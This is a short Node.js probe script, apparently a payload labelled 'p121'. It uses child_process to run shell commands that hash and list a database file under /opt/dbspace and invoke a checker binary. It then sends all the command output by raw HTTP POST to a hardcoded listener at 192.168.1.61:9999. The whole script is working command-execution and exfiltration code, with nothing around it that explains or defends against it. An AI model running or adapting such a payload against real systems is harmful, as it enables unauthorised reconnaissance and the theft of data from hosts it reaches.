"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var net = require('net');
var HOST='192.168.1.61', PORT=9999;
var R={ts:new Date().toISOString(), probe:'p121', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,500));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},3000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p121info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function md5(p){return run('md5sum '+p+' 2>&1; ls -la '+p+' 2>&1',15000,1000);}
function main(){
  R.results.live0=md5('/opt/dbspace/.app-context.db');
  R.results.c0=run('/usr/bin/app-context-db-checker 2>&1',20000,2000);
  R.results.live1=md5('/opt/dbspace/.app-context.db');
  R.results.c1=run('/usr/bin/app-context-db-checker /opt/dbspace/.app-context_1.db 2>&1',20000,2000);
  R.results.live2=md5('/opt/dbspace/.app-context.db');
  R.results.c2=run('/usr/bin/app-context-db-checker /opt/dbspace/.app-context.db 2>&1',20000,2000);
  R.results.live3=md5('/opt/dbspace/.app-context.db');
  R.results.final='done '+new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal,20000);
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
